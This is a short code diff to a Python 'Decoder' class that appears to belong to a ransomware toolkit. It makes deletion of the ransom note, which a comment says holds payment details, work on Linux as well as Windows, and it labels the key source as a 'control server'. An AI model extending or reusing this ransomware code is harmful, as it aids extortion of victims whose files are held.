@@ -38,9 +38,12 @@ class Decoder:
             return response.get('key')
 
     def delete_readme(self):
-
-        desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
-        readme_path = os.path.join(desktop_path, 'Readme.txt')
+        if os.name == 'nt':
+            desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop') # salva um arquivo com informações para pagamento, na area de trabalho 
+            readme_path = os.path.join(desktop_path, 'Readme.txt')
+        elif os.name == 'posix':
+            desktop_path = os.path.join(os.path.join(os.environ['HOME']), 'Área de Trabalho')
+            readme_path = os.path.join(desktop_path, 'Readme.txt')
 
         if os.path.exists(readme_path):
             os.remove(readme_path)
@@ -52,7 +55,7 @@ class Decoder:
         print("Memory cleared.")
 def main():
     directory = 'dosyalar/'  # Replace with the target directory path
-    server_host = '10.0.2.37'
+    server_host = '10.0.2.37' # should be replaced with the control server ip address
     server_port = 12345
     print("Waiting for key...")
 
